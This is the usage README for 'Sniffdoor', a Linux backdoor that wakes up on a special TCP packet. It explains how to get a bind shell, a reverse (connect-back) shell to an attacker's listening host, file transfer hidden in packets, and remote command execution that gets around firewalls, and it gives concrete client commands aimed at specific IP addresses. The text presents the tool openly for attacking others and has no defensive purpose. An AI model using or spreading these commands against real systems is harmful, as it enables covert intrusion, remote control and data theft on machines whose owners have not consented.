 +--------------------------------------------------+

 Sniffdoor is a linux backdoor woke up with a special
 tcp packet.It can bind a shell with tty,it can send
 files with tcp packet,that's means the server side
 can sniff your files in the special tcp packets,
 and save on its server.The client can send a shell
 command with the packet,the server sniff and execute
 it,so it can round the firewall.

 +--------------------------------------------------+
 [USAGE]:
 
 server:
 
 $make;
 ./sniffdoor
 
 client:
 $make;
 ./sniffclient

 sniffdoor <options> [remote_ip] [port] [command]

 <options>:
 -packet <remote_ip> [port] <command>
 -connect <remote ip> <port>
 -listen  <port>

 <command>:
 bind:<port>
 back:<remote_ip> <port>
 file:<filename>
 comm:<command>
 
 1. bindshell:
    send tcp packet to host 61.155.217.56,and then it
    bind a shell on port 999
   ./client -packet 61.155.217.56 bind:999
   ./client -packet 61.155.217.56 22 bind:999
   port 22 is a active port on the host.

 2.connect back door:
    1).you server must listen a port first(your ip
       is 123.45.64.57):
    ./client -listen 999

    2).send tcp packet to host 61.155.217.56,and then
    bind a shell to remote 123.45.64.57 on port 999
    ./client -packet 61.155.217.56 back:123.45.64.57:999
    ./client -packet 61.155.217.56 21 back:123.45.64.57:999
    
 3.send file:
    1).send file with tcp packet.
    ./client -packet 61.155.217.56 file:bind.c
    ./client -packet 61.155.217.56 80 file:bind.c
    
    NOTE!
    It can only send txt files , not binary files.
    If you fixed up this bug,mail to me,thx.
 
 4.execute command:
    1).execute command with tcp packet.
    ./client -packet 61.155.217.56 comm:"gcc -o bind bind.c"
    ./client -packet 61.155.217.56 23 comm:"gcc -o bind bind.c"
